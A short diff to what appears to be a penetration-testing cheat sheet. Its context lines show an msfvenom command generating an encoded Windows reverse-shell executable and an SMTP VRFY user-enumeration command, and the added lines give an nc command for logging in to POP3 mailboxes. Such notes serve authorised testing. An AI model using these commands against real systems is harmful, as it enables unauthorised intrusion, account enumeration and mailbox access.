@@ -480,3 +480,6 @@ msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e x86/al
 
 Enumerate users from smtp:
 smtp-user-enum -M VRFY -u claire -t 192.168.55.55
+
+Connect to pop port to login to mail boxes:
+nc -v ipordomain 110
